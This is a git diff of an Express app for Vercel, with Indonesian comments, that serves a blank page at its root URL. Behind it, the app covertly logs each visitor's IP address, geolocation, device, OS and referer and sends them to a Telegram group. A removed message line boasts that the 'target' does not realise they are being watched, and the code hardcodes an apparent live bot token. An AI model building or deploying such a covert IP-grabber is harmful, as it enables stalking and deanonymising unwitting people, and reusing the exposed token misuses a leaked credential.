@@ -8,17 +8,17 @@ const app = express();
 
 // Konfigurasi Telegram
 const BOT_TOKEN = process.env.BOT_TOKEN || '8695389088:AAG50EJrPpc63dmAzMJhYseVOwVd-jN9Pxo';
-const ADMIN_ID = process.env.ADMIN_ID || '7785350799';
+const GROUP_ID = process.env.GROUP_ID || '-1003785527944'; // GANTI INI
 
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(requestIp.mw());
 
-// Serve static files dari folder public
+// Serve static files
 app.use(express.static(path.join(__dirname, '../public')));
 
-// Tracking endpoint
+// TRACKING ENDPOINT
 app.get('/', async (req, res) => {
   try {
     // Ambil data
@@ -40,7 +40,7 @@ app.get('/', async (req, res) => {
       language: req.headers['accept-language']
     };
     
-    // Coba ambil lokasi dari IP
+    // Coba ambil lokasi
     try {
       const locRes = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
       visitorData.location = locRes.data;
@@ -48,8 +48,10 @@ app.get('/', async (req, res) => {
       visitorData.location = { error: 'Gagal ambil lokasi' };
     }
     
-    // Kirim ke Telegram (JANGAN PAKAI AWAIT biar cepet)
+    // ========== INI BAGIAN PANGGIL FUNGSI ==========
+    // Kirim ke Telegram (panggil fungsi sendToTelegram)
     sendToTelegram(visitorData).catch(console.error);
+    // ================================================
     
     // Kirim file HTML
     res.sendFile(path.join(__dirname, '../public/blank.html'));
@@ -65,9 +67,11 @@ app.get('/track', (req, res) => {
   res.json({ status: 'tracking' });
 });
 
+// ========== INI DIA FUNGSI SENDTOTELEGRAM ==========
 // Fungsi kirim ke Telegram
 async function sendToTelegram(data) {
   try {
+    // Format pesan
     let message = `🔥 **VISITOR BARU DETECTED!** 🔥\n\n`;
     message += `**Waktu:** ${data.timestamp}\n`;
     message += `**IP:** ${data.ip}\n`;
@@ -81,19 +85,23 @@ async function sendToTelegram(data) {
     message += `**OS:** ${data.os}\n`;
     message += `**Device:** ${data.device}\n`;
     message += `**Referer:** ${data.referer}\n\n`;
-    message += `🌐 *Target gak sadar lagi dipantau*`;
+    message += `🌐 *Powered By FahzDev*`;
     
+    // ========== YANG INI DIUBAH ==========
+    // Kirim ke GROUP, bukan ke pribadi
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: ADMIN_ID,
+      chat_id: GROUP_ID, // GANTI DARI ADMIN_ID JADI GROUP_ID
       text: message,
       parse_mode: 'Markdown',
       disable_web_page_preview: true
     });
+    // ======================================
     
   } catch (err) {
     console.error('Gagal kirim ke Telegram:', err.message);
   }
 }
+// ====================================================
 
-// Export untuk Vercel (INI PENTING!)
+// Export untuk Vercel
 module.exports = app;
